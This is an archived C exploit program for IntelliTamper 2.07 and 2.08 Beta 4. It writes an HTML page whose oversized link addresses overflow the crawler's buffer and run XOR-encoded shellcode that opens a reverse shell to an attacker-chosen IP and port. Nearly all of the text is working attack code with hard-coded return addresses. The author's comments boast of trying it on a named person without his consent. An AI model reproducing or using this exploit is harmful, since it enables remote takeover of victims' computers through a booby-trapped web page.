<html><head><title>IntelliTamper 2.07/2.08 Beta 4 A HREF Remote Buffer Overflow Exploit</title></head><pre>/********************************************************************/
/* [Crpt]  IntelliTamper v2.07/2.08 Beta 4 sploit by kralor  [Crpt] */
/********************************************************************/
/*                             NO MORE                              */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/********************************************************************/
/* Exploit testé sur Jef_FR a son insu, ca marche bien a 100%  :)     */
/* Jef_FR pourra vous le confirmer hihi :P                          */
/* Au fait c'est universel pcq si la personne utilise la v2.08beta4 */
/* ben y'a du SEH alors le premier lien qui est fait plus petit     */
/* pour la v2.07 ca fera pas planter, ca sera pris en charge par le */
/* programme.. Bref que dire de plus... Si ce n'est qu'on peut p-e  */
/* jumper direct sans aller a un jmp ebx, en utilisant 0x00F1FFDC   */
/* j'ai remarqué que sur les deux versions une fois que ca crash    */
/* (je catch l'exception meme si le prog a du SEH!) ebx pointe vers */
/* cet offset toujours le meme (~fin de notre buffer). J'ai pas     */
/* regardé sur d'autres plateformes, vu que j'ai deja des ret       */
/* (jmp ebx) qui vont tres bien  :)  c'est tout les poulets, enjoy.   */
/*                                                                  */
/* P.S: Faut regarder que votre IP xoré par 0x98 donne pas un bad   */
/* opcode du genre &lt; &gt; &quot; \r \n ... C'est pas sorcier a coder  :)      */
/********************************************************************/
/* informations: www.coromputer.net, irc undernet #coromputer       */
/********************************************************************/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef _WIN32
#include &lt;winsock.h&gt;
#pragma comment(lib, &quot;ws2_32&quot;)
#else
#include &lt;arpa/inet.h&gt;
#endif

#define SIZEOF   14448                 /* IntelliTamper v2.08 Beta 4 AND v2.07
                                        * for v2.07 it isn't this size 'cause
                                        * there's a *missing* in RET_ADDR2
                                        * so it cuts the size.
                                        */

#define SCOFFSET 10000                 /* IntelliTamper v2.08 Beta 4 */
#define RET_POS  SIZEOF-4
#define RET_ADDR 0x004368C4

#define SCOFFSET2 100                  /* IntelliTamper v2.07 */
#define RET_POS2  6832
#define RET_ADDR2 0x00437224

#define u_short unsigned short
#define u_char  unsigned char
#define HOP 0xd9 /* host opcode */
#define POP 0xda /* port opcode */
#define BEGIN &quot;&lt;HTML&gt;&lt;HEAD&gt;hi&lt;/HEAD&gt;\r\n&lt;BODY&gt;\r\n&quot;
#define END   &quot;&lt;/BODY&gt;\r\n&lt;/HTML&gt;&quot;

int set_sc(char *host,unsigned long port, char *sc)
{
  unsigned long ip,p;
  unsigned int i;

  ip=inet_addr(host)^0x98989898;
  p=htons((u_short)port);
  p=p&lt;&lt;16;
  p+=0x0002;
  p=p^0x98989898;

for(i=0;i&lt;strlen(sc);i++) {
  if((u_char)sc[i]==HOP&amp;&amp;(u_char)sc[i+1]==HOP)
    if((u_char)sc[i+2]==HOP&amp;&amp;(u_char)sc[i+3]==HOP) {
      memcpy(sc+i,&amp;ip,4);
      ip=0;
      }
  if((u_char)sc[i]==POP&amp;&amp;(u_char)sc[i+1]==POP)
    if((u_char)sc[i+2]==POP&amp;&amp;(u_char)sc[i+3]==POP) {
      memcpy(sc+i,&amp;p,4);
      p=0;
      }
  }

if(ip||p) {
  printf(&quot;error: unable to find ip/port sequence in shellc0de\n&quot;);
  return -1;
  }
  return 0;
}

void syntax(char *prog)
{
  printf(&quot;syntax: %s &lt;file&gt; &lt;rshell_ip&gt; &lt;rshell_port&gt;\n&quot;,prog);
  exit(0);
}

void banner(void)
{
  printf(&quot;\n\t[Crpt] IntelliTamper v2.07/2.08 Beta 4 sploit &quot; \
         &quot;by kralor [Crpt]\n&quot;);
  printf(&quot;\t\t  www.coromputer.net &amp;&amp; undernet #coromputer\n\n&quot;);
  return;
}

int main(int argc, char *argv[])
{
  char buffer[SIZEOF];
  unsigned long port;
  FILE *file;
  char shellc0de[] =   /* sizeof(shellc0de+xorer) == 334 bytes */
  /* classic xorer */
  /* &quot;\xcc&quot; */
  &quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66&quot;
  &quot;\xb9\x3f\x01\x80\x33\x98\x43\xe2\xfa&quot;
  /* shellc0de */
  &quot;\x19\x5c\x50\x98\x98\x98\x13\x74\x13\x6c\xcd\xce\xfc\x39\xa8\x98&quot;
  &quot;\x98\x98\x13\xd8\x94\x13\xe8\x84\x35\x13\xf0\x90\x73\x98\x13\x5d&quot;
  &quot;\xc6\xc5\x11\x9e\x67\xae\xf0\x16\xd6\x96\x74\x70\x35\x98\x98\x98&quot;
  &quot;\xf0\xab\xaa\x98\x98\xf0\xef\xeb\xaa\xc7\xcc\x67\x48\x13\x60\xcf&quot;
  &quot;\xf0\x41\x91\x6d\x35\x70\x0b\x98\x98\x98\xab\x51\xc9\xc9\xc9\xc9&quot;
  &quot;\xd9\xc9\xd9\xc9\x67\x48\x11\xde\xbc\xcf\xf0\x74\x61\x32\xf8\x70&quot;
  &quot;\xe1\x98\x98\x98\xf0\xd9\xd9\xd9\xd9\xf0\xda\xda\xda\xda\x13\x54&quot;
  &quot;\xf2\x88\xc9\x67\xee\xbc\x67\x48\xf0\xfb\xf5\xfc\x98\x11\xfe\xa8&quot;
  &quot;\x67\xae\xf0\xea\x66\x2b\x8e\x70\xc9\x98\x98\x98\x11\xde\x86\x1b&quot;
  &quot;\x74\xcc\x15\xa4\xbc\xab\x58\xab\x51\x1b\x59\x8d\x33\x7a\x65\x5e&quot;
  &quot;\xdc\xbc\x88\xdc\x66\xdc\xbc\xa5\x66\xdc\xbc\xa4\x13\xde\xbc\x11&quot;
  &quot;\xdc\xbc\xd0\x11\xdc\xbc\xd4\x11\xdc\xbc\xc8\x15\xdc\xbc\x88\xcc&quot;
  &quot;\xc8\xc9\xc9\xc9\xf2\x99\xc9\xc9\x67\xee\xa8\xc9\x67\xce\x86\x67&quot;
  &quot;\xae\xf0\x77\x56\x78\xf8\x70\x9a\x98\x98\x98\x67\x48\xcb\xcd\xce&quot;
  &quot;\xcf\x13\xf4\xbc\x80\x13\xdd\xa4\x13\xcc\x9d\xe0\x9b\x4d\x13\xd2&quot;
  &quot;\x80\x13\xc2\xb8\x9b\x45\x7b\xaa\xd1\x13\xac\x13\x9b\x6d\xab\x67&quot;
  &quot;\x64\xab\x58\x34\xa2\x5c\xec\x9f\x59\x57\x95\x9b\x60\x73\x6a\xa3&quot;
  &quot;\xe4\xbc\x8c\xed\x79\x13\xc2\xbc\x9b\x45\xfe\x13\x94\xd3\x13\xc2&quot;
  &quot;\x84\x9b\x45\x13\x9c\x13\x9b\x5d\x73\x9a\xab\x58\x13\x4d\xc7\xc6&quot;
  &quot;\xc5\xc3\x5a\x9c\x98&quot;;

  banner();

  if(argc!=4)
    syntax(argv[0]);

  port=atoi(argv[3]);
  if(port&lt;=0||port&gt;65535) {
    printf(&quot;error: &lt;port&gt; must be between 1 and 65535\r\n&quot;);
    return -1;
  }
  printf(&quot;[S] ip: %s port: %d file: %s\r\n&quot;,argv[2],port,argv[1]);
  printf(&quot;[C] Setting universal %-39s ...&quot;,&quot;shellcode&quot;);
  if(set_sc(argv[2],port,shellc0de))
    return -1;
  printf(&quot;DONE\r\n&quot;);
  file=fopen(argv[1],&quot;w&quot;);
  if(!file) {
    printf(&quot;error: unable to open %s\r\n&quot;,argv[1]);
    return -1;
  }
  printf(&quot;[C] Writing magic link for Intellitamper %-20s ...&quot;,&quot;v2.07&quot;);
  fprintf(file,BEGIN);
  fprintf(file,&quot;sex drugs and rock'n'roll&lt;BR&gt;\r\n&quot;);

  memset(buffer,0x90,sizeof(buffer));
  *(unsigned long*)&amp;buffer[RET_POS2] = RET_ADDR2;
  memcpy(buffer+SCOFFSET2,shellc0de,sizeof(shellc0de)-1);
  memcpy(buffer+6836-8,&quot;\xEB\xE0&quot;,2); /* jmp $ - 0x10 */
  memcpy(buffer+6836-16,&quot;\xE9\x8F\xE5\xFF\xFF&quot;,5); /* jmp $ - ??? */

  fprintf(file,&quot;&lt;A HREF=\&quot;&quot;);
  fprintf(file,buffer);
  fprintf(file,&quot;\&quot;&gt;sexy bitch&lt;/A&gt;&lt;BR&gt;\r\n&quot;);
  printf(&quot;DONE\r\n&quot;);

  printf(&quot;[C] Writing magic link for Intellitamper %-20s ...&quot;,&quot;v2.08 Beta 4&quot;);
  memset(buffer,0x90,sizeof(buffer));
  *(unsigned long*)&amp;buffer[RET_POS] = RET_ADDR;
  memcpy(buffer+SCOFFSET,shellc0de,sizeof(shellc0de)-1);
  memcpy(buffer+SIZEOF-8,&quot;\xEB\xE0&quot;,2); /* jmp $ - 0x10 */
  memcpy(buffer+SIZEOF-16,&quot;\xE9\x8F\xEB\xFF\xFF&quot;,5); /* jmp $ - ??? */

  fprintf(file,&quot;&lt;A HREF=\&quot;&quot;);
  fprintf(file,buffer);
  fprintf(file,&quot;\&quot;&gt;not sexy bitch&lt;/A&gt;&lt;BR&gt;\r\n&quot;);
  printf(&quot;DONE\r\n&quot;);

  fprintf(file,END);
  fclose(file);
  printf(&quot;[C] All job done\r\n&quot;);
  return 0;
}

// milw0rm.com [2008-08-13]</pre></html>